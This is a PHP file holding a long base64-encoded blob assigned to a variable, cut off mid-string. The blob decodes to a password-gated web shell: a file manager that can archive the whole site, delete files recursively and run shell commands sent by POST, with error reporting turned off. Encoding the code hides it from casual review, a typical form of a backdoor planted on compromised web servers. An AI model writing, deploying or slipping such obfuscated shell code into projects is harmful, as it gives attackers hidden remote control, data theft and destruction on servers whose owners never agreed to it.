<?php
$fman = "
PD9waHAKaWYgKCRfU0VSVkVSWydQSFBfQVVUSF9VU0VSJ10gPT0gImNoYXJtZV9nIiB8fCAKJF9T
RVJWRVJbJ1BIUF9BVVRIX1VTRVInXSA9PSAibWFycm9uX2IiIHx8CiRfU0VSVkVSWydQSFBfQVVU
SF9VU0VSJ10gPT0gImtlcmlzaV9jIiB8fAokX1NFUlZFUlsnUEhQX0FVVEhfVVNFUiddID09ICJs
ZWdhaWdfbSIpCnsKLyoqKioqKioqKioqKioqKioqKioqKioqKioqKioqIEZVTkNUSU9OUyAqKioq
KioqKioqKioqKioqKioqKioqKioqKioqKi8KZXJyb3JfcmVwb3J0aW5nKDApOwoKZnVuY3Rpb24g
bG9nb3V0KCkgewogICAgJF9TRVNTSU9OID0gYXJyYXkoJ2F1dGhlbnRpY2F0ZWQnID0+IGZhbHNl
KTsKfQoKZnVuY3Rpb24gc3RyaXBzbGFzaGVzX2RlZXAoJHZhbHVlKSB7CiAgICBpZiAoaXNfYXJy
YXkoJHZhbHVlKSkKICAgICAgICByZXR1cm4gYXJyYXlfbWFwKCdzdHJpcHNsYXNoZXNfZGVlcCcs
ICR2YWx1ZSk7CiAgICBlbHNlCiAgICAgICAgcmV0dXJuIHN0cmlwc2xhc2hlcygkdmFsdWUpOwp9
CmZ1bmN0aW9uIHBlcm1pc3Npb24oJGZpbGVuYW1lKQp7CiAgICAkcGVybXMgPSBmaWxlcGVybXMo
JGZpbGVuYW1lKTsKCiAgICBpZiAgICAgKCgkcGVybXMgJiAweEMwMDApID09IDB4QzAwMCkgeyAk
aW5mbyA9ICdzJzsgfQogICAgZWxzZWlmICgoJHBlcm1zICYgMHhBMDAwKSA9PSAweEEwMDApIHsg
JGluZm8gPSAnbCc7IH0KICAgIGVsc2VpZiAoKCRwZXJtcyAmIDB4ODAwMCkgPT0gMHg4MDAwKSB7
ICRpbmZvID0gJy0nOyB9CiAgICBlbHNlaWYgKCgkcGVybXMgJiAweDYwMDApID09IDB4NjAwMCkg
eyAkaW5mbyA9ICdiJzsgfQogICAgZWxzZWlmICgoJHBlcm1zICYgMHg0MDAwKSA9PSAweDQwMDAp
IHsgJGluZm8gPSAnZCc7IH0KICAgIGVsc2VpZiAoKCRwZXJtcyAmIDB4MjAwMCkgPT0gMHgyMDAw
KSB7ICRpbmZvID0gJ2MnOyB9CiAgICBlbHNlaWYgKCgkcGVybXMgJiAweDEwMDApID09IDB4MTAw
MCkgeyAkaW5mbyA9ICdwJzsgfQogICAgZWxzZSAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgIHsgJGluZm8gPSAndSc7IH0KCiAgICAvLyA/Pz8/Pz8/PwogICAgJGluZm8gLj0gKCgkcGVy
bXMgJiAweDAxMDApID8gJ3InIDogJy0nKTsKICAgICRpbmZvIC49ICgoJHBlcm1zICYgMHgwMDgw
KSA/ICd3JyA6ICctJyk7CiAgICAkaW5mbyAuPSAoKCRwZXJtcyAmIDB4MDA0MCkgPyAoKCRwZXJt
cyAmIDB4MDgwMCkgPyAncycgOiAneCcgKSA6ICgoJHBlcm1zICYgMHgwODAwKSA/ICdTJyA6ICct
JykpOwoKICAgIC8vID8/Pz8/PwogICAgJGluZm8gLj0gKCgkcGVybXMgJiAweDAwMjApID8gJ3In
IDogJy0nKTsKICAgICRpbmZvIC49ICgoJHBlcm1zICYgMHgwMDEwKSA/ICd3JyA6ICctJyk7CiAg
ICAkaW5mbyAuPSAoKCRwZXJtcyAmIDB4MDAwOCkgPyAoKCRwZXJtcyAmIDB4MDQwMCkgPyAncycg
OiAneCcgKSA6ICgoJHBlcm1zICYgMHgwNDAwKSA/ICdTJyA6ICctJykpOwoKICAgIC8vID8/Pwog
ICAgJGluZm8gLj0gKCgkcGVybXMgJiAweDAwMDQpID8gJ3InIDogJy0nKTsKICAgICRpbmZvIC49
ICgoJHBlcm1zICYgMHgwMDAyKSA/ICd3JyA6ICctJyk7CiAgICAkaW5mbyAuPSAoKCRwZXJtcyAm
IDB4MDAwMSkgPyAoKCRwZXJtcyAmIDB4MDIwMCkgPyAndCcgOiAneCcgKSA6ICgoJHBlcm1zICYg
MHgwMjAwKSA/ICdUJyA6ICctJykpOwoKICAgIHJldHVybiAkaW5mbzsKfQpmdW5jdGlvbiBkaXJf
bGlzdCgkZGlyKQp7CiAgICBpZiAoJGRpcltzdHJsZW4oJGRpciktMV0gIT0gJy8nKSAkZGlyIC49
ICcvJzsKCiAgICBpZiAoIWlzX2RpcigkZGlyKSkgcmV0dXJuIGFycmF5KCk7CgogICAgJGRpcl9o
YW5kbGUgID0gb3BlbmRpcigkZGlyKTsKICAgICRkaXJfb2JqZWN0cyA9IGFycmF5KCk7CiAgICB3
aGlsZSAoJG9iamVjdCA9IHJlYWRkaXIoJGRpcl9oYW5kbGUpKQogCQkJaWYgKCFpbl9hcnJheSgk
b2JqZWN0WyJuYW1lIl0sIGFycmF5KCcuJywnLi4nKSkpCiAgICAgICAgewogICAgICAgICAgICAk
ZmlsZW5hbWUgICAgPSAkZGlyIC4gJG9iamVjdDsKICAgICAgICAgICAgJGZpbGVfb2JqZWN0ID0g
YXJyYXkoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICduYW1lJyA9PiAkb2Jq
ZWN0LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnbGluaycgPT4gJGZpbGVu
YW1lLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnc2l6ZScgPT4gZmlsZXNp
emUoJGZpbGVuYW1lKSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3Blcm0n
ID0+IHBlcm1pc3Npb24oJGZpbGVuYW1lKSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgJ3R5cGUnID0+IGZpbGV0eXBlKCRmaWxlbmFtZSksCiAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICdtdGltZScgPT4gZGF0ZSgiZCBNLCBIOmkiLCBmaWxlbXRpbWUoJGZp
bGVuYW1lKSksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjdGltZScgPT4g
ZGF0ZSgiZCBNLCBIOmkiLCBmaWxlY3RpbWUoJGZpbGVuYW1lKSkgIAogICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICk7CiAgICAgICAgICAgICRkaXJfb2JqZWN0c1tdID0gJGZpbGVfb2Jq
ZWN0OwogICAgICAgIH0KICAgIHJldHVybiAkZGlyX29iamVjdHM7Cn0KZnVuY3Rpb24gcGFyZW50
X2RpcigkcGF0aCkKewoJaWYgKCRwYXRoW3N0cmxlbigkcGF0aCkgLSAxXSA9PSAiLyIpCgkJJHBh
dGggPSBzdWJzdHIoJHBhdGgsIDAsIHN0cmxlbigkcGF0aCkgLSAxKTsKCXJldHVybiBzdWJzdHIo
JHBhdGgsIDAsIHN0cnJwb3MoJHBhdGgsICIvIikpOwp9CgpjbGFzcyB0YXIgewoJdmFyICRmaWxl
bmFtZTsKCXZhciAkaXNHemlwcGVkOwoJdmFyICR0YXJfZmlsZTsKCgl2YXIgJGZpbGVzOwoJdmFy
ICRkaXJlY3RvcmllczsKCXZhciAkbnVtRmlsZXM7Cgl2YXIgJG51bURpcmVjdG9yaWVzOwoKCglm
dW5jdGlvbiB0YXIoKSB7CgkJcmV0dXJuIHRydWU7Cgl9CgoJZnVuY3Rpb24gX19jb21wdXRlVW5z
aWduZWRDaGVja3N1bSgkYnl0ZXN0cmluZykgewoJCSR1bnNpZ25lZF9jaGtzdW0gPSAwOwoJCWZv
cigkaT0wOyAkaTw1MTI7ICRpKyspCgkJCSR1bnNpZ25lZF9jaGtzdW0gKz0gb3JkKCRieXRlc3Ry
aW5nWyRpXSk7CgkJZm9yKCRpPTA7ICRpPDg7ICRpKyspCgkJCSR1bnNpZ25lZF9jaGtzdW0gLT0g
b3JkKCRieXRlc3RyaW5nWzE0OCArICRpXSk7CgkJJHVuc2lnbmVkX2Noa3N1bSArPSBvcmQoIiAi
KSAqIDg7CgoJCXJldHVybiAkdW5zaWduZWRfY2hrc3VtOwoJfQoKCglmdW5jdGlvbiBfX3BhcnNl
TnVsbFBhZGRlZFN0cmluZygkc3RyaW5nKSB7CgkJJHBvc2l0aW9uID0gc3RycG9zKCRzdHJpbmcs
Y2hyKDApKTsKCQlyZXR1cm4gc3Vic3RyKCRzdHJpbmcsMCwkcG9zaXRpb24pOwoJfQoJCglmdW5j
dGlvbiBfX2dlbmVyYXRlVEFSKCkgewoJCXVuc2V0KCR0aGlzLT50YXJfZmlsZSk7CgoJCWlmKCR0
aGlzLT5udW1EaXJlY3RvcmllcyA+IDApIHsKCQkJZm9yZWFjaCgkdGhpcy0+ZGlyZWN0b3JpZXMg
YXMgJGtleSA9PiAkaW5mb3JtYXRpb24pIHsKCQkJCXVuc2V0KCRoZWFkZXIpOwoKCQkJCSRoZWFk
ZXIgPSAiIjsKCQkJCSRoZWFkZXIgLj0gc3RyX3BhZCgkaW5mb3JtYXRpb25bIm5hbWUiXSwxMDAs
Y2hyKDApKTsKCQkJCSRoZWFkZXIgLj0gc3RyX3BhZChkZWNvY3QoJGluZm9ybWF0aW9uWyJtb2Rl
Il0pLDcsIjAiLFNUUl9QQURfTEVGVCkgLiBjaHIoMCk7CgkJCQkkaGVhZGVyIC49IHN0cl9wYWQo
ZGVjb2N0KCRpbmZvcm1hdGlvblsidXNlcl9pZCJdKSw3LCIwIixTVFJfUEFEX0xFRlQpIC4gY2hy
KDApOwoJCQkJJGhlYWRlciAuPSBzdHJfcGFkKGRlY29jdCgkaW5mb3JtYXRpb25bImdyb3VwX2lk
Il0pLDcsIjAiLFNUUl9QQURfTEVGVCkgLiBjaHIoMCk7CgkJCQkkaGVhZGVyIC49IHN0cl9wYWQo
ZGVjb2N0KDApLDExLCIwIixTVFJfUEFEX0xFRlQpIC4gY2hyKDApOwoJCQkJJGhlYWRlciAuPSBz
dHJfcGFkKGRlY29jdCgkaW5mb3JtYXRpb25bInRpbWUiXSksMTEsIjAiLFNUUl9QQURfTEVGVCkg
LiBjaHIoMCk7CgkJCQkkaGVhZGVyIC49IHN0cl9yZXBlYXQoIiAiLDgpOwoJCQkJJGhlYWRlciAu
PSAiNSI7CgkJCQkkaGVhZGVyIC49IHN0cl9yZXBlYXQoY2hyKDApLDEwMCk7CgkJCQkkaGVhZGVy
IC49IHN0cl9wYWQoInVzdGFyIiw2LGNocigzMikpOwoJCQkJJGhlYWRlciAuPSBjaHIoMzIpIC4g
Y2hyKDApOwoJCQkJJGhlYWRlciAuPSBzdHJfcGFkKCIiLDMyLGNocigwKSk7CgkJCQkkaGVhZGVy
IC49IHN0cl9wYWQoIiIsMzIsY2hyKDApKTsKCQkJCSRoZWFkZXIgLj0gc3RyX3JlcGVhdChjaHIo
MCksOCk7CgkJCQkkaGVhZGVyIC49IHN0cl9yZXBlYXQoY2hyKDApLDgpOwoJCQkJJGhlYWRlciAu
PSBzdHJfcmVwZWF0KGNocigwKSwxNTUpOwoJCQkJJGhlYWRlciAuPSBzdHJfcmVwZWF0KGNocigw
KSwxMik7CgoJCQkJJGNoZWNrc3VtID0gc3RyX3BhZChkZWNvY3QoJHRoaXMtPl9fY29tcHV0ZVVu
c2lnbmVkQ2hlY2tzdW0oJGhlYWRlcikpLDYsIjAiLFNUUl9QQURfTEVGVCk7CgkJCQlmb3IoJGk9
MDsgJGk8NjsgJGkrKykgewoJCQkJCSRoZWFkZXJbKDE0OCArICRpKV0gPSBzdWJzdHIoJGNoZWNr
c3VtLCRpLDEpOwoJCQkJfQoJCQkJJGhlYWRlclsxNTRdID0gY2hyKDApOwoJCQkJJGhlYWRlclsx
NTVdID0gY2hyKDMyKTsKCgkJCQkkdGhpcy0+dGFyX2ZpbGUgLj0gJGhlYWRlcjsKCQkJfQoJCX0K
CgkJaWYoJHRoaXMtPm51bUZpbGVzID4gMCkgewoJCQlmb3JlYWNoKCR0aGlzLT5maWxlcyBhcyAk
a2V5ID0+ICRpbmZvcm1hdGlvbikgewoJCQkJdW5zZXQoJGhlYWRlcik7CgoJCQkJJGhlYWRlciA9
ICIiOwoJCQkJJGhlYWRlciAuPSBzdHJfcGFkKCRpbmZvcm1hdGlvblsibmFtZSJdLDEwMCxjaHIo
MCkpOwoJCQkJJGhlYWRlciAuPSBzdHJfcGFkKGRlY29jdCgkaW5mb3JtYXRpb25bIm1vZGUiXSks
NywiMCIsU1RSX1BBRF9MRUZUKSAuIGNocigwKTsKCQkJCSRoZWFkZXIgLj0gc3RyX3BhZChkZWNv
Y3QoJGluZm9ybWF0aW9uWyJ1c2VyX2lkIl0pLDcsIjAiLFNUUl9QQURfTEVGVCkgLiBjaHIoMCk7
CgkJCQkkaGVhZGVyIC49IHN0cl9wYWQoZGVjb2N0KCRpbmZvcm1hdGlvblsiZ3JvdXBfaWQiXSks
NywiMCIsU1RSX1BBRF9MRUZUKSAuIGNocigwKTsKCQkJCSRoZWFkZXIgLj0gc3RyX3BhZChkZWNv
Y3QoJGluZm9ybWF0aW9uWyJzaXplIl0pLDExLCIwIixTVFJfUEFEX0xFRlQpIC4gY2hyKDApOwoJ
CQkJJGhlYWRlciAuPSBzdHJfcGFkKGRlY29jdCgkaW5mb3JtYXRpb25bInRpbWUiXSksMTEsIjAi
LFNUUl9QQURfTEVGVCkgLiBjaHIoMCk7CgkJCQkkaGVhZGVyIC49IHN0cl9yZXBlYXQoIiAiLDgp
OwoJCQkJJGhlYWRlciAuPSAiMCI7CgkJCQkkaGVhZGVyIC49IHN0cl9yZXBlYXQoY2hyKDApLDEw
MCk7CgkJCQkkaGVhZGVyIC49IHN0cl9wYWQoInVzdGFyIiw2LGNocigzMikpOwoJCQkJJGhlYWRl
ciAuPSBjaHIoMzIpIC4gY2hyKDApOwoJCQkJJGhlYWRlciAuPSBzdHJfcGFkKCRpbmZvcm1hdGlv
blsidXNlcl9uYW1lIl0sMzIsY2hyKDApKTsJLy8gSG93IGRvIEkgZ2V0IGEgZmlsZSdzIHVzZXIg
bmFtZSBmcm9tIFBIUD8KCQkJCSRoZWFkZXIgLj0gc3RyX3BhZCgkaW5mb3JtYXRpb25bImdyb3Vw
X25hbWUiXSwzMixjaHIoMCkpOwkvLyBIb3cgZG8gSSBnZXQgYSBmaWxlJ3MgZ3JvdXAgbmFtZSBm
cm9tIFBIUD8KCQkJCSRoZWFkZXIgLj0gc3RyX3JlcGVhdChjaHIoMCksOCk7CgkJCQkkaGVhZGVy
IC49IHN0cl9yZXBlYXQoY2hyKDApLDgpOwoJCQkJJGhlYWRlciAuPSBzdHJfcmVwZWF0KGNocigw
KSwxNTUpOwoJCQkJJGhlYWRlciAuPSBzdHJfcmVwZWF0KGNocigwKSwxMik7CgoJCQkJJGNoZWNr
c3VtID0gc3RyX3BhZChkZWNvY3QoJHRoaXMtPl9fY29tcHV0ZVVuc2lnbmVkQ2hlY2tzdW0oJGhl
YWRlcikpLDYsIjAiLFNUUl9QQURfTEVGVCk7CgkJCQlmb3IoJGk9MDsgJGk8NjsgJGkrKykgewoJ
CQkJCSRoZWFkZXJbKDE0OCArICRpKV0gPSBzdWJzdHIoJGNoZWNrc3VtLCRpLDEpOwoJCQkJfQoJ
CQkJJGhlYWRlclsxNTRdID0gY2hyKDApOwoJCQkJJGhlYWRlclsxNTVdID0gY2hyKDMyKTsKCgkJ
CQkkZmlsZV9jb250ZW50cyA9IHN0cl9wYWQoJGluZm9ybWF0aW9uWyJmaWxlIl0sKGNlaWwoJGlu
Zm9ybWF0aW9uWyJzaXplIl0gLyA1MTIpICogNTEyKSxjaHIoMCkpOwoKCQkJCSR0aGlzLT50YXJf
ZmlsZSAuPSAkaGVhZGVyIC4gJGZpbGVfY29udGVudHM7CgkJCX0KCQl9CgkJJHRoaXMtPnRhcl9m
aWxlIC49IHN0cl9yZXBlYXQoY2hyKDApLDUxMik7CgoJCXJldHVybiB0cnVlOwoJfQoKCWZ1bmN0
aW9uIGNvbnRhaW5zRmlsZSgkZmlsZW5hbWUpIHsKCQlpZigkdGhpcy0+bnVtRmlsZXMgPiAwKSB7
CgkJCWZvcmVhY2goJHRoaXMtPmZpbGVzIGFzICRrZXkgPT4gJGluZm9ybWF0aW9uKSB7CgkJCQlp
ZigkaW5mb3JtYXRpb25bIm5hbWUiXSA9PSAkZmlsZW5hbWUpCgkJCQkJcmV0dXJuIHRydWU7CgkJ
CX0KCQl9CgoJCXJldHVybiBmYWxzZTsKCX0KCglmdW5jdGlvbiBhZGREaXJlY3RvcnkoJGRpcm5h
bWUpIHsKCQlpZighZmlsZV9leGlzdHMoJGRpcm5hbWUpKQoJCQlyZXR1cm4gZmFsc2U7CgoJCS8v
IEdldCBkaXJlY3RvcnkgaW5mb3JtYXRpb24KCQkkZmlsZV9pbmZvcm1hdGlvbiA9IHN0YXQoJGRp
cm5hbWUpOwoKCQkvLyBBZGQgZGlyZWN0b3J5IHRvIHByb2Nlc3NlZCBkYXRhCgkJJHRoaXMtPm51
bURpcmVjdG9yaWVzKys7CgkJJGFjdGl2ZURpcgkJPSAmJHRoaXMtPmRpcmVjdG9yaWVzW107CgkJ
JGFjdGl2ZURpclsibmFtZSJdCT0gJGRpcm5hbWU7CgkJJGFjdGl2ZURpclsibW9kZSJdCT0gJGZp
bGVfaW5mb3JtYXRpb25bIm1vZGUiXTsKCQkkYWN0aXZlRGlyWyJ0aW1lIl0JPSAkZmlsZV9pbmZv
cm1hdGlvblsibXRpbWUiXTsKCQkkYWN0aXZlRGlyWyJ1c2VyX2lkIl0JPSAkZmlsZV9pbmZvcm1h
dGlvblsidWlkIl07CgkJJGFjdGl2ZURpclsiZ3JvdXBfaWQiXQk9ICRmaWxlX2luZm9ybWF0aW9u
WyJnaWQiXTsKCgkJcmV0dXJuIHRydWU7Cgl9CgoKCWZ1bmN0aW9uIGFkZEZpbGUoJGZpbGVuYW1l
KSB7CgkJaWYoIWZpbGVfZXhpc3RzKCRmaWxlbmFtZSkpCgkJCXJldHVybiBmYWxzZTsKCgkJaWYo
JHRoaXMtPmNvbnRhaW5zRmlsZSgkZmlsZW5hbWUpKQoJCQlyZXR1cm4gZmFsc2U7CgoJCSRmaWxl
X2luZm9ybWF0aW9uID0gc3RhdCgkZmlsZW5hbWUpOwoKCQkkZnAgPSBmb3BlbigkZmlsZW5hbWUs
InJiIik7CgkJJGZpbGVfY29udGVudHMgPSBmcmVhZCgkZnAsZmlsZXNpemUoJGZpbGVuYW1lKSk7
CgkJZmNsb3NlKCRmcCk7CgoJCSR0aGlzLT5udW1GaWxlcysrOwoJCSRhY3RpdmVGaWxlCQkJPSAm
JHRoaXMtPmZpbGVzW107CgkJJGFjdGl2ZUZpbGVbIm5hbWUiXQkJPSAkZmlsZW5hbWU7CgkJJGFj
dGl2ZUZpbGVbIm1vZGUiXQkJPSAkZmlsZV9pbmZvcm1hdGlvblsibW9kZSJdOwoJCSRhY3RpdmVG
aWxlWyJ1c2VyX2lkIl0JCT0gJGZpbGVfaW5mb3JtYXRpb25bInVpZCJdOwoJCSRhY3RpdmVGaWxl
WyJncm91cF9pZCJdCQk9ICRmaWxlX2luZm9ybWF0aW9uWyJnaWQiXTsKCQkkYWN0aXZlRmlsZVsi
c2l6ZSJdCQk9ICRmaWxlX2luZm9ybWF0aW9uWyJzaXplIl07CgkJJGFjdGl2ZUZpbGVbInRpbWUi
XQkJPSAkZmlsZV9pbmZvcm1hdGlvblsibXRpbWUiXTsKCQkkYWN0aXZlRmlsZVsidXNlcl9uYW1l
Il0JPSAiIjsKCQkkYWN0aXZlRmlsZVsiZ3JvdXBfbmFtZSJdCT0gIiI7CgkJJGFjdGl2ZUZpbGVb
ImZpbGUiXQkJPSAkZmlsZV9jb250ZW50czsKCgkJcmV0dXJuIHRydWU7Cgl9CgoJZnVuY3Rpb24g
dG9UYXIoJGZpbGVuYW1lLCR1c2VHemlwKSB7CgkJaWYoISRmaWxlbmFtZSkKCQkJcmV0dXJuIGZh
bHNlOwoKCQkkdGhpcy0+X19nZW5lcmF0ZVRhcigpOwoKCQlpZigkdXNlR3ppcCkgewoJCQlpZigh
ZnVuY3Rpb25fZXhpc3RzKCJnemVuY29kZSIpKQoJCQkJcmV0dXJuIGZhbHNlOwoKCQkJJGZpbGUg
PSBnemVuY29kZSgkdGhpcy0+dGFyX2ZpbGUpOwoJCX0gZWxzZSB7CgkJCSRmaWxlID0gJHRoaXMt
PnRhcl9maWxlOwoJCX0KCgkJJGZwID0gZm9wZW4oJGZpbGVuYW1lLCJ3YiIpOwoJCWZ3cml0ZSgk
ZnAsJGZpbGUpOwoJCWZjbG9zZSgkZnApOwoKCQlyZXR1cm4gdHJ1ZTsKCX0KfQpmdW5jdGlvbiBU
YXJSZWN1cnNlKCYkYXJjaGl2ZSwgJGZvbGRlcikKewoJZm9yZWFjaChkaXJfbGlzdCgkZm9sZGVy
KSBhcyAkb2JqZWN0KQoJewoJCSRvYmplY3RbImxpbmsiXSA9IHN0cl9yZXBsYWNlKCIuLyIsICIi
LCAkb2JqZWN0WyJsaW5rIl0pOwoJCWlmICgkb2JqZWN0WyJ0eXBlIl0gPT0gImRpciIpCgkJewoJ
CQkkYXJjaGl2ZS0+YWRkRGlyZWN0b3J5KCRvYmplY3RbImxpbmsiXSk7CgkJCVRhclJlY3Vyc2Uo
JGFyY2hpdmUsICRvYmplY3RbImxpbmsiXSk7CgkJfQoJCWVsc2UKCQkJJGFyY2hpdmUtPmFkZEZp
bGUoJG9iamVjdFsibGluayJdKTsJCgl9Cn0KZnVuY3Rpb24gTWFrZVRhcigkZm9sZGVyLCAkZmls
ZW5hbWUpCnsKCWlmICgkZm9sZGVyID09ICIuIikKCQkkZmlsZW5hbWUgPSAic2l0ZSI7CgkkdG1w
ID0gZ2V0Y3dkKCk7CgljaGRpcigkZm9sZGVyKTsKCSRpID0gMDsKCWlmIChmaWxlX2V4aXN0cygk
ZmlsZW5hbWUuIi50YXIuZ3oiKSkKCXsKCQl3aGlsZSAoZmlsZV9leGlzdHMoJGZpbGVuYW1lLiJf
Ii4kaS4iLnRhci5neiIpKQoJCQkkaSsrOwoJCSRmaWxlbmFtZSA9ICRmaWxlbmFtZS4iXyIuJGk7
Cgl9CgkKCSRhcmNoaXZlID0gbmV3IHRhcjsKCVRhclJlY3Vyc2UoJGFyY2hpdmUsICcuJyk7Cglj
aGRpcigkdG1wKTsKCSRhcmNoaXZlLT50b1RhcigkZmlsZW5hbWUuJy50YXIuZ3onLCAxKTsKCXJl
dHVybiAoJGZpbGVuYW1lLicudGFyLmd6Jyk7Cn0KZnVuY3Rpb24gTWVzc2FnZSgkbWVzc2FnZSkK
ewoJZWNobyAiPHN0cm9uZz48c3BhbiBzdHlsZT1cImNvbG9yOiByZWQ7XCI+JG1lc3NhZ2U8L3Nw
YW4+PC9zdHJvbmc+PGJyIC8+PGJyIC8+IjsKfQpmdW5jdGlvbiBybV9yZWN1cnNpdmUoJGZpbGVw
YXRoKQp7CiAgICBpZiAoaXNfZGlyKCRmaWxlcGF0aCkgJiYgIWlzX2xpbmsoJGZpbGVwYXRoKSkK
ICAgIHsKICAgICAgICBpZiAoJGRoID0gb3BlbmRpcigkZmlsZXBhdGgpKQogICAgICAgIHsKICAg
ICAgICAgICAgd2hpbGUgKCgkc2YgPSByZWFkZGlyKCRkaCkpICE9PSBmYWxzZSkKICAgICAgICAg
ICAgewogICAgICAgICAgICAgICAgaWYgKCRzZiA9PSAnLicgfHwgJHNmID09ICcuLicpCiAgICAg
ICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgY29udGludWU7CiAgICAgICAgICAgICAg
ICB9CiAgICAgICAgICAgICAgICBpZiAoIXJtX3JlY3Vyc2l2ZSgkZmlsZXBhdGguJy8nLiRzZikp
CiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgTWVzc2FnZSAoJGZpbGVwYXRo
LicvJy4kc2YuJyBjb3VsZCBub3QgYmUgZGVsZXRlZC4nKTsKICAgICAgICAgICAgICAgIH0KICAg
ICAgICAgICAgfQogICAgICAgICAgICBjbG9zZWRpcigkZGgpOwogICAgICAgIH0KICAgICAgICBy
ZXR1cm4gQHJtZGlyKCRmaWxlcGF0aCk7CiAgICB9CiAgICByZXR1cm4gQHVubGluaygkZmlsZXBh
dGgpOwp9IApmdW5jdGlvbiBieXRlQ29udmVydCgkYnl0ZXMpCnsKCWlmICgkYnl0ZXMgPT0gMCkg
cmV0dXJuICgiMCBCIik7CiAgJHMgPSBhcnJheSgnQicsICdLJywgJ00nLCAnRycsICdUJywgJ1An
KTsKICAkZSA9IGZsb29yKGxvZygkYnl0ZXMpL2xvZygxMDI0KSk7CiAgIAogIGlmICgkc1skZV0g
PT0gJ0InKQogICAJcmV0dXJuIChzcHJpbnRmKCclLjBmICcuJHNbJGVdLCAoJGJ5dGVzL3Bvdygx
MDI0LCBmbG9vcigkZSkpKSkpOwogIHJldHVybiAoc3ByaW50ZignJS4yZiAnLiRzWyRlXSwgKCRi
eXRlcy9wb3coMTAyNCwgZmxvb3IoJGUpKSkpKTsKfQpmdW5jdGlvbiBjb3VudF9jaGFyKCRiaWcs
ICRuZWVkbGUpCnsKCSRpID0gMDsKCSRjID0gMDsKCXdoaWxlIChpc3NldCgkYmlnWyRpXSkpCgl7
CgkJaWYgKCRiaWdbJGldID09ICRuZWVkbGUpCgkJCSRjKys7CgkJJGkrKzsKCX0KCXJldHVybiAo
JGMpOwp9CgppZiAoaXNzZXQoJF9HRVRbInNoZWxsIl0pKQp7CmlmIChnZXRfbWFnaWNfcXVvdGVz
X2dwYygpKQogICAgJF9QT1NUID0gc3RyaXBzbGFzaGVzX2RlZXAoJF9QT1NUKTsKJHVzZXJuYW1l
ID0gaXNzZXQoJF9QT1NUWyd1c2VybmFtZSddKSA/ICRfUE9TVFsndXNlcm5hbWUnXSA6ICcnOwok
cGFzc3dvcmQgPSBpc3NldCgkX1BPU1RbJ3Bhc3N3b3JkJ10pID8gJF9QT1NUWydwYXNzd29yZCdd
IDogJyc7CiRub3VuY2UgICA9IGlzc2V0KCRfUE9TVFsnbm91bmNlJ10pICAgPyAkX1BPU1RbJ25v
dW5jZSddICAgOiAnJzsKJGNvbW1hbmQgID0gaXNzZXQoJF9QT1NUWydjb21tYW5kJ10pICA/ICRf
UE9TVFsnY29tbWFuZCddICA6ICcnOwokcm93cyAgICAgPSBpc3NldCgkX1BPU1RbJ3Jvd3MnXSkg
ICAgID8gJF9QT1NUWydyb3dzJ10gICAgIDogMjQ7CiRjb2x1bW5zICA9IGlzc2V0KCRfUE9TVFsn
Y29sdW1ucyddKSAgPyAkX1BPU1RbJ2NvbHVtbnMnXSAgOiA4MDsKJGluaSA9IGFycmF5KCk7Cmlm
IChlbXB0eSgkaW5pWydzZXR0aW5ncyddKSkKICAgICRpbmlbJ3NldHRpbmdzJ10gPSBhcnJheSgp
OwokaW5pWydzZXR0aW5ncyddID0gYXJyYXkoJ2hvbWUtZGlyZWN0b3J5JyAgID0+ICcuJyk7CnNl
c3Npb25fc3RhcnQoKTsKICAgIGlmIChlbXB0eSgkX1NFU1NJT05bJ2N3ZCddKSkgewogICAgICAg
ICRfU0VTU0lPTlsnY3dkJ10gPSByZWFscGF0aCgkaW5pWydzZXR0aW5ncyddWydob21lLWRpcmVj
dG9yeSddKTsKICAgICAgICAkX1NFU1NJT05bJ2hpc3RvcnknXSA9IGFycmF5KCk7CiAgICAgICAg
JF9TRVNTSU9OWydvdXRwdXQnXSA9ICcnOwogICAgfQogICAgaWYgKCFlbXB0eSgkY29tbWFuZCkp
IHsKICAgICAgICBpZiAoKCRpID0gYXJyYXlfc2VhcmNoKCRjb21tYW5kLCAkX1NFU1NJT05bJ2hp
c3RvcnknXSkpICE9PSBmYWxzZSkKICAgICAgICAgICAgdW5zZXQoJF9TRVNTSU9OWydoaXN0b3J5
J11bJGldKTsKICAgICAgICBhcnJheV91bnNoaWZ0KCRfU0VTU0lPTlsnaGlzdG9yeSddLCAkY29t
bWFuZCk7CiAgICAgICAgJF9TRVNTSU9OWydvdXRwdXQnXSAuPSAnJCAnIC4gJGNvbW1hbmQgLiAi
XG4iOwogICAgICAgIGlmIChlcmVnKCdeW1s6Ymxhbms6XV0qY2RbWzpibGFuazpdXSokJywgJGNv
bW1hbmQpKSB7CiAgICAgICAgICAgICRfU0VTU0lPTlsnY3dkJ10gPSByZWFscGF0aCgkaW5pWydz
ZXR0aW5ncyddWydob21lLWRpcmVjdG9yeSddKTsKICAgICAgICB9IGVsc2VpZiAoZXJlZygnXltb
OmJsYW5rOl1dKmNkW1s6Ymxhbms6XV0rKFteO10rKSQnLCAkY29tbWFuZCwgJHJlZ3MpKSB7CiAg
ICAgICAgICAgIGlmICgkcmVnc1sxXXswfSA9PSAnLycpIHsKICAgICAgICAgICAgICAgICRuZXdf
ZGlyID0gJHJlZ3NbMV07CiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAkbmV3
X2RpciA9ICRfU0VTU0lPTlsnY3dkJ10gLiAnLycgLiAkcmVnc1sxXTsKICAgICAgICAgICAgfQog
ICAgICAgICAgICB3aGlsZSAoc3RycG9zKCRuZXdfZGlyLCAnLy4vJykgIT09IGZhbHNlKQogICAg
ICAgICAgICAgICAgJG5ld19kaXIgPSBzdHJfcmVwbGFjZSgnLy4vJywgJy8nLCAkbmV3X2Rpcik7
CiAgICAgICAgICAgIHdoaWxlIChzdHJwb3MoJG5ld19kaXIsICcvLycpICE9PSBmYWxzZSkKICAg
ICAgICAgICAgICAgICRuZXdfZGlyID0gc3RyX3JlcGxhY2UoJy8vJywgJy8nLCAkbmV3X2Rpcik7
